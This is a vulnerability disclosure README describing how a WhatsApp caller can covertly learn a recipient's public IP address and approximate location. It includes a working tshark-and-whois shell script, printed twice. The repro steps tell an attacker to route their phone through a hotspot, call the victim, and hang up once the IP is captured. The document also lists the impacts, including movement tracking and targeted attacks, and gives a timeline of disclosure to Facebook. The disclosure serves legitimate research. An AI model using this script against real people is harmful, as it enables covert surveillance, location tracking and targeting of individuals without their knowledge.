## Leak the IP address and Geolocation of target whatsapp user 

### Disclaimer

This program is for Educational purpose ONLY. Do not use it without permission. The usual disclaimer applies, especially the fact that me (bhdresh) is not liable for any damages caused by direct or indirect use of the information or functionality provided by these programs. The author or any Internet provider bears NO responsibility for content or misuse of these programs or any derivatives thereof. By using this program you accept the fact that any damage (dataloss, system crash, system compromise, etc.) caused by the use of these programs is not bhdresh's responsibility.

Finally, this is a personal development, please respect its philosophy and don't use it for bad things!

### Description/Impact

#### PoC Video:

https://vimeo.com/577355374

#### Complete Details

Latest version of whatsapp application on all platforms is vulnerable to remote whatsapp user public IP disclosure.

It is observed that during a whatsapp (voice / video) call, application on caller side tries to establish a direct connection with the public IP address of recipient device. By filtering the Facebook and WhatsApp server IP addresses from the destination hosts, it is possible to reveal the correct public IP address of the target whatsapp user without his knowledge.

Following is a quick script to exploit this vulnerability,

--------------------------

#!/bin/sh

filter=`tshark -i eth0 -T fields -f "udp" -e ip.dst -Y "ip.dst!=192.168.0.0/16 and ip.dst!=10.0.0.0/8 and ip.dst!=172.16.0.0/12" -c 100 |sort -u |xargs|sed "s/ / and ip.dst!=/g" |sed "s/^/ip.dst!=/g"`

echo "Press Enter and call your target."

read line

tshark -i eth0 -l -T fields -f "udp" -e ip.dst -Y "$filter" -Y "ip.dst!=192.168.0.0/16 and ip.dst!=10.0.0.0/8 and ip.dst!=172.16.0.0/12" | while read line
do
whois $line > /tmp/b

filter=`cat /tmp/b |xargs| egrep -iv "facebook|google"|wc -l`

if [ "$filter" -gt 0 ] ; then
targetinfo=`cat /tmp/b| egrep -iw "OrgName:|NetName:|Country:"`
echo $line --- $targetinfo
fi
done


--------------------------

#### Impact


Possibility to map whatsapp users with their public IP will not just reveal whatsapp users' location information but can also be misused to track their physical movement by maintaining location history. Such direct mapping between user to IP information can also be misused to track users' surfing habits and to influence him.

Further, the public IP could be exploited to launch targeted attacks towards whatsapp user home or office.

### Repro Steps

#### Setup

Users: UserA is has whatsapp detail of UserB

Environment: n/a

Browser: n/a

App version: <=latest version of whatsapp application on any platform

OS: All platforms except web

Description: UserA makes a whatsapp call to UserB and captures his public IP information without UserB's knowledge. Video PoC for better understanding of steps: https://vimeo.com/577355374



#### Steps

Step 1: Start WiFi hotspot on attacker machine and connect attacker phone to attacker SSID

Step 2: Start the PoC script (below) on attacker machine which is now acting as a router for attacker phone


--------------------------

#!/bin/sh

filter=`tshark -i eth0 -T fields -f "udp" -e ip.dst -Y "ip.dst!=192.168.0.0/16 and ip.dst!=10.0.0.0/8 and ip.dst!=172.16.0.0/12" -c 100 |sort -u |xargs|sed "s/ / and ip.dst!=/g" |sed "s/^/ip.dst!=/g"`

echo "Press Enter and call your target."

read line

tshark -i eth0 -l -T fields -f "udp" -e ip.dst -Y "$filter" -Y "ip.dst!=192.168.0.0/16 and ip.dst!=10.0.0.0/8 and ip.dst!=172.16.0.0/12" | while read line
do
whois $line > /tmp/b

filter=`cat /tmp/b |xargs| egrep -iv "facebook|google"|wc -l`

if [ "$filter" -gt 0 ] ; then
targetinfo=`cat /tmp/b| egrep -iw "OrgName:|NetName:|Country:"`
echo $line --- $targetinfo
fi
done


--------------------------


Step 3: Call any whatsapp user randomly to capture the server IP addresses to filter

Step 4: Call victim on his whatsapp

Step 5: Disconnect the call once established

Step 6: Script will reveal the public IP address of the target

Step 7: Validate the public IP address on target phone

### Disclosure timeline

1) October 14, 2020 - Reported vulnerability to Facebook
2) October 14, 2020 - Response from Facebook (Thank you for your report. In this case, the issue you've described is actually just intended functionality and therefore doesn't qualify for a bounty.)
3) October 14, 2020 - Reply to Facebook (could you please let me know how WhatsApp users could mitigate this accidental disclosure of his IP and potential private information about his location?)
4) October 16, 2020 - Follow up email
5) October 20, 2020 - Response from Facebook (Due to the nature of the peer to peer protocol, the best methods for users who may be concerned about accidental disclosure is to take a proactive approach. This can include limiting calls to trusted users or using a VPN.)
6) January 18, 2021 - Requesting permission for public disclosure (In such a case, is it fine if I publish this finding with public disclosure?)
7) January 18, 2021 - Response from Facebook (The decision to publish is entirely yours. There are no penalties for doing so.)
8) March 20, 2021 - Further communication with Facebook (During my research have noticed that Signal has introduced a feature to relay calls through the signal server to void revealing IP addresses....Could you please recheck the approach to limit calls to trusted users or using a VPN? I believe using VPN all the time is not a feasible solution to protect the location privacy.)
9) March 23, 2021 - Response from Facebook (At this time we are content with our current implementation of WhatsApp calling.)
10) July 03, 2021 - Public disclosure
